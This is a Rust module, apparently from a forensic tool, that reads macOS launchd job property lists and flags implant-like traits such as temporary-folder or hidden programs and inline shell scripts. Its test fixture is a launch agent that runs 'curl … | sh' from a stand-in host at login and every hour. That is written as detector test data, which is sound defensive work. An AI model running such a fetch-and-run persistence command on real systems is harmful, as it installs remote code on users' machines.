//! launchd jobs: the property lists in `LaunchAgents` (started for a user
//! at login) and `LaunchDaemons` (started by the system at boot), in
//! `/Library`, `/System/Library` and each user's `~/Library`, read with
//! `sootmark-plist` (binary or XML). What a job runs (`Program`, else the
//! first of `ProgramArguments`), when (`RunAtLoad`, `KeepAlive`,
//! `StartInterval`, `StartCalendarInterval`, `WatchPaths`), and as whom
//! (`UserName`) are the persistence questions; [`LaunchJob::flags`] lists
//! traits that look like an implant's.

use plist::Value;

use crate::Error;

/// Where a program in a temporary, shared or hidden place lives.
const SUSPICIOUS_FOLDERS: [&str; 5] = [
    "/tmp/",
    "/private/tmp/",
    "/var/tmp/",
    "/users/shared/",
    "/dev/shm/",
];
/// Interpreters a job may hand an inline script to.
const INTERPRETERS: [&str; 7] = [
    "sh",
    "bash",
    "zsh",
    "python",
    "python3",
    "osascript",
    "perl",
];

/// Which kind of launchd job, from the folder it's in.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum JobKind {
    /// `LaunchAgents`: runs in a user's session.
    Agent,
    /// `LaunchDaemons`: runs for the system, as root unless `UserName`.
    Daemon,
}

/// One launchd job.
#[derive(Debug, Clone, PartialEq)]
pub struct LaunchJob {
    /// Agent or daemon, from the path; `None` when the path doesn't say.
    pub kind: Option<JobKind>,
    /// `Label`.
    pub label: Option<String>,
    /// `Program`.
    pub program: Option<String>,
    /// `ProgramArguments`.
    pub arguments: Vec<String>,
    /// When launchd starts it.
    pub triggers: Triggers,
    /// `UserName`.
    pub user_name: Option<String>,
    /// `Disabled`.
    pub disabled: bool,
}

/// When launchd starts a job.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Triggers {
    /// `RunAtLoad`: at boot (daemon) or login (agent).
    pub run_at_load: bool,
    /// `KeepAlive`: true, or a dictionary of conditions (kept as present).
    pub keep_alive: bool,
    /// `StartInterval`, seconds.
    pub start_interval: Option<i64>,
    /// `StartCalendarInterval` is set.
    pub calendar: bool,
    /// `WatchPaths`: started when one of them changes.
    pub watch_paths: Vec<String>,
}

/// A trait of a job that looks like an implant's: leads, not verdicts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum JobFlag {
    /// The program is in `/tmp`, `/var/tmp`, `/Users/Shared` or
    /// `/dev/shm`: writable by anyone, or vanishing at reboot.
    TemporaryFolder,
    /// A component of the program's path starts with a dot: hidden.
    HiddenPath,
    /// An interpreter given an inline script (`sh -c …`, `python -c …`,
    /// `osascript -e …`).
    InlineScript,
    /// Neither `Program` nor `ProgramArguments`: nothing to run, or a
    /// damaged file.
    NoProgram,
}

impl JobFlag {
    /// A short label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::TemporaryFolder => "runs from a temporary or shared folder",
            Self::HiddenPath => "runs from a hidden path",
            Self::InlineScript => "inline script",
            Self::NoProgram => "no program",
        }
    }
}

impl LaunchJob {
    /// What the job runs: `Program`, else the first argument.
    #[must_use]
    pub fn executable(&self) -> Option<&str> {
        self.program
            .as_deref()
            .or_else(|| self.arguments.first().map(String::as_str))
    }

    /// The command line: the program and its arguments. launchd runs
    /// `Program` with `ProgramArguments` as its argv; without `Program`,
    /// the arguments' first is the program.
    #[must_use]
    pub fn command_line(&self) -> Option<String> {
        let arguments = self.arguments.join(" ");
        match (&self.program, self.arguments.first()) {
            (Some(program), Some(first)) if first != program => {
                Some(format!("{program} {arguments}"))
            }
            (Some(program), None) => Some(program.clone()),
            (_, Some(_)) => Some(arguments),
            (None, None) => None,
        }
    }

    /// Traits that look like an implant's, in [`JobFlag`] order.
    #[must_use]
    pub fn flags(&self) -> Vec<JobFlag> {
        let Some(executable) = self.executable() else {
            return vec![JobFlag::NoProgram];
        };
        let lower = executable.to_ascii_lowercase();
        let program = lower.rsplit('/').next().unwrap_or(&lower);
        let inline = INTERPRETERS.contains(&program)
            && self
                .arguments
                .iter()
                .skip(1)
                .any(|a| a == "-c" || a == "-e");
        [
            (
                JobFlag::TemporaryFolder,
                SUSPICIOUS_FOLDERS.iter().any(|f| lower.starts_with(f)),
            ),
            (
                JobFlag::HiddenPath,
                executable
                    .split('/')
                    .any(|part| part.len() > 1 && part.starts_with('.')),
            ),
            (JobFlag::InlineScript, inline),
        ]
        .into_iter()
        .filter_map(|(flag, found)| found.then_some(flag))
        .collect()
    }
}

/// A job read from its property list.
#[derive(Debug, Clone, PartialEq)]
pub struct Launchd {
    /// The job.
    pub job: LaunchJob,
    /// Damage in the property list.
    pub problems: Vec<String>,
}

/// Read a launchd job's property list found at `path`.
///
/// # Errors
/// When it isn't a property list, or not a dictionary.
pub fn read_launchd(data: &[u8], path: &str) -> Result<Launchd, Error> {
    let plist = plist::parse(data).map_err(|e| Error(format!("not a property list: {e}")))?;
    let root = &plist.value;
    if root.as_dictionary().is_none() {
        return Err(Error("a property list, but not a launchd job".to_owned()));
    }
    let text = |key: &str| root.get(key).and_then(Value::as_str).map(str::to_owned);
    let flag = |key: &str| root.get(key).is_some_and(|v| v.as_bool() != Some(false));
    let strings = |key: &str| -> Vec<String> {
        root.get(key)
            .and_then(Value::as_array)
            .map(|items| {
                items
                    .iter()
                    .filter_map(Value::as_str)
                    .map(str::to_owned)
                    .collect()
            })
            .unwrap_or_default()
    };
    let job = LaunchJob {
        kind: kind_of(path),
        label: text("Label"),
        program: text("Program"),
        arguments: strings("ProgramArguments"),
        triggers: Triggers {
            run_at_load: root.get("RunAtLoad").and_then(Value::as_bool) == Some(true),
            keep_alive: flag("KeepAlive"),
            start_interval: root.get("StartInterval").and_then(Value::as_i64),
            calendar: root.get("StartCalendarInterval").is_some(),
            watch_paths: strings("WatchPaths"),
        },
        user_name: text("UserName"),
        disabled: root.get("Disabled").and_then(Value::as_bool) == Some(true),
    };
    Ok(Launchd {
        job,
        problems: plist.problems,
    })
}

/// Agent or daemon, from the folder the file is in.
pub(crate) fn kind_of(path: &str) -> Option<JobKind> {
    let path = path.replace('\\', "/").to_ascii_lowercase();
    let folder = path.rsplit('/').nth(1)?;
    match folder {
        "launchagents" => Some(JobKind::Agent),
        "launchdaemons" => Some(JobKind::Daemon),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const AGENT: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.example.update</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s https://example.com/u | sh</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>
<key>StartInterval</key><integer>3600</integer>
</dict></plist>"#;

    #[test]
    fn an_agent_with_an_inline_script() {
        let read = read_launchd(
            AGENT.as_bytes(),
            "Users/alice/Library/LaunchAgents/com.example.update.plist",
        )
        .unwrap();
        let job = &read.job;
        assert_eq!(job.kind, Some(JobKind::Agent));
        assert_eq!(job.label.as_deref(), Some("com.example.update"));
        assert_eq!(job.executable(), Some("/bin/sh"));
        assert!(job.triggers.run_at_load && job.triggers.keep_alive);
        assert_eq!(job.triggers.start_interval, Some(3600));
        assert_eq!(job.flags(), [JobFlag::InlineScript]);
    }

    #[test]
    fn hidden_and_temporary_programs() {
        let job = LaunchJob {
            kind: Some(JobKind::Daemon),
            label: None,
            program: Some("/Users/Shared/.cache/agent".to_owned()),
            arguments: Vec::new(),
            triggers: Triggers {
                run_at_load: true,
                ..Triggers::default()
            },
            user_name: None,
            disabled: false,
        };
        assert_eq!(job.flags(), [JobFlag::TemporaryFolder, JobFlag::HiddenPath]);
        assert!(read_launchd(b"not a plist", "x.plist").is_err());
    }
}
